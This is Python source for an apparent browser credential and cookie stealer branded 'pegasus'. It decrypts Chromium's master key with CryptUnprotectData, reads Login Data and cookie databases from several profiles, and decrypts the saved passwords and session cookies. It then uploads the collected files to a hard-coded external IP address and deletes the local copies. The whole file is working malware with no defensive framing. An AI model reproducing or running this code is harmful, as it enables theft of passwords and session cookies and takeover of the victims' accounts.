import json
import os
import shutil
import sqlite3
from base64 import b64decode
from shutil import copy2
from sqlite3 import connect
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from tools.send import upload_file


def get_appdata():
    appdata = os.getenv("localappdata")
    return appdata


def create_password_file(path, name):
    with open(f"{name}-passwords.txt", "w") as f:
        f.write(f"pegasus /// {name} Passwords\n\n")
    if os.path.exists(get_appdata() + '\\Google'):
        grabPassword(get_appdata(), path, name)


def check_path_exists(appdata, name):
    return os.path.exists(appdata + f'\\{name}')


def get_master_key(appdata, path):
    with open(appdata + f'{path}\\User Data\\Local State', "r", encoding="utf-8") as f:
        local_state = f.read()
    local_state = json.loads(local_state)

    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return "Chrome < 80"


def grabPassword(appdata, path, name):
    master_key = get_master_key(appdata, path)

    login_dbs = [
        appdata + f'{path}\\User Data\\Default\\Login Data',
        appdata + f'{path}\\User Data\\Profile 1\\Login Data',
        appdata + f'{path}\\User Data\\Profile 2\\Login Data',
        appdata + f'{path}\\User Data\\Profile 3\\Login Data',
        appdata + f'{path}\\User Data\\Profile 4\\Login Data',
        appdata + f'{path}\\User Data\\Profile 5\\Login Data',
    ]

    used_login_dbs = []
    # Rest of the code remains same
    # ...
    for login_db in login_dbs:
        if not os.path.exists(login_db):
            continue

        used_login_dbs.append(login_db)

        try:
            copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if url != "" and username != "" and decrypted_password != "":
                    with open(f"{name}-passwords.txt", "a") as f:
                        f.write(f"DB: {login_db}\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    with open(f"{name}-passwords.txt", "a") as f:
        f.write("\n\nUsed Login Dbs:\n")
        f.write("\n".join(used_login_dbs))

    upload_file(f"{name}-passwords.txt", '187.65.202.131')
    # Delete the file after uploading
    os.remove(f"{name}-passwords.txt")


def create_cookie_file(path, name):
    with open(f"{name}-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
        f.write("pegasus /// Google Chrome Cookies\n\n")
    grabCookies(get_appdata(), path, name)


def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"


def grabCookies(appdata, path, name):
    master_key = get_master_key(appdata, path)

    login_dbs = [
        appdata + f'{path}\\User Data\\Default\\Network\\cookies',
        appdata + f'{path}\\User Data\\Profile 1\\Network\\cookies',
        appdata + f'{path}\\User Data\\Profile 2\\Network\\cookies',
        appdata + f'{path}\\User Data\\Profile 3\\Network\\cookies',
        appdata + f'{path}\\User Data\\Profile 4\\Network\\cookies',
        appdata + f'{path}\\User Data\\Profile 5\\Network\\cookies',
    ]

    used_login_dbs = []

    for login_db in login_dbs:
        if not os.path.exists(login_db):
            continue
        used_login_dbs.append(login_db)
        login = ".\\Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(f"{name}-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
                        f"DB: {login_db}\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    with open(f"{name}-cookies.txt", "a") as f:
        f.write("\n\nUsed Login Dbs:\n")
        f.write("\n".join(used_login_dbs))
    upload_file(f"{name}-cookies.txt", '187.65.202.131')
    # Delete the file after uploading
    os.remove(f"{name}-cookies.txt")
